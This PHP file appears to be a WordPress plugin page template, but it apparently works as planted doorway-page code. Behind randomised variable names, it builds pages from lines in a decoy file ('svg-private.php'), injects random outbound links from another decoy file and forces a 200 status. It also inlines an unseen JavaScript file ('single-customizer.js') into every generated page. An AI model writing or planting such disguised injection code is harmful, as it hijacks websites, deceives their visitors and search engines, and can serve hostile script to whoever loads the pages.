<?php
$m8yK3znjl = intval(get_query_var('izufs'));

if ($m8yK3znjl < 1 || $m8yK3znjl > 2718) return;
$hynGe = file(plugin_dir_path(__FILE__).'svg-private.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$pcgW9Ow = explode(';', $hynGe[$m8yK3znjl]);
if (count($pcgW9Ow) < 2) return;
$hharLfvXV = $pcgW9Ow[0];
$tTCTOK  = $pcgW9Ow[1];
$kUTGBSf5 = $pcgW9Ow[2];
$lA0NU  = $pcgW9Ow[3];
$bBVct6cu = $pcgW9Ow[4];
set_query_var('crbopwbh', $hharLfvXV);

$rKoTGJW = '';
$tYaDcXVR = plugin_dir_path(__FILE__).'marketplace-restrict.php';
if (is_file($tYaDcXVR)) {
	$pvDRKmtZ = file($tYaDcXVR, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($pvDRKmtZ);
	shuffle($pvDRKmtZ);
	$qeQrzmbk = mt_rand(2, 5);
	if (count($pvDRKmtZ) > $qeQrzmbk) {
		for ($jCa7R6E9 = 0; $jCa7R6E9 < $qeQrzmbk; $jCa7R6E9++) {
			$g4sNqhufS = array_shift($pvDRKmtZ);
			$rKoTGJW .= '<p><a href="'.$g4sNqhufS.'">'.$g4sNqhufS.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $hharLfvXV; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $tTCTOK . "</p>\n";
				if (strlen($lA0NU) > 0) echo "<p>" . $lA0NU . "</p>\n";
				if (strlen($kUTGBSf5) > 0) echo "<p>" . $kUTGBSf5 . "</p>\n";
				if (strlen($bBVct6cu) > 0) echo '<p><a href="#"><img src="'.$bBVct6cu.'"></a>' . "</p>\n";
				echo $rKoTGJW;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$os0wfqar = plugin_dir_path(__FILE__) . 'single-customizer.js';
if (is_file($os0wfqar)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($os0wfqar);
	echo '</script>';
}
get_footer();
?>
